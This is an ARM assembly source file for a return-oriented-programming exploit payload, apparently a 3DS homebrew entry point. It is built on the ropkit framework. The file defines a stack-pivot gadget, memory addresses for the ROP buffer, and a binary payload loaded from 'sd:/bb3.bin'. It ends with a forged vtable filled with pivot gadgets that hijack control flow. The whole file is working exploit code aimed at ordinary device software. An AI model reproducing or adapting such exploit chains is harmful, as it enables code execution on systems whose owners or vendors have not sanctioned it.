	.arm
	.text
	
#include "defines_11x.h"

#define GARBAGE 0xdeadb0b0
#define STACK_PIVOT ROP_POPR3_ADDSPR3_POPPC

#define ROPBUF 0x006AA000     //bss location of rop payload (ropkit_boototherapp.s) that launches otherapp
#define ROPKIT_LINEARMEM_REGIONBASE 0x30000000
#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x100000)

#define ROPKIT_BINPAYLOAD_PATH "sd:/bb3.bin"
#define ROPKIT_BINPAYLOAD_FILEOFFSET 0x8000  //put bb3 installer inside bb3.bin
#define ROPKIT_BINLOAD_SIZE 0x3000

#define ROPKIT_MOUNTSD        
#define ROPKIT_TMPDATA 0x0FFFc000
#define ROPKIT_BINLOAD_TEXTOFFSET 0x0
//#define ROPKIT_ENABLETERMINATE_GSPTHREAD
#define ROPKIT_BEFOREJUMP_CACHEBUFADDR ROPKIT_LINEARMEM_BUF
#define ROPKIT_BEFOREJUMP_CACHEBUFSIZE 0x2000  //large gsgpu flush fixes our new3ds L2 cache issues - and increases stability for old3ds


#include "ropkit_ropinclude.s" 

_start:
ropstackstart:

#include "ropkit_boototherapp.s"   

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x80 / 4), 4, STACK_PIVOT @ Vtable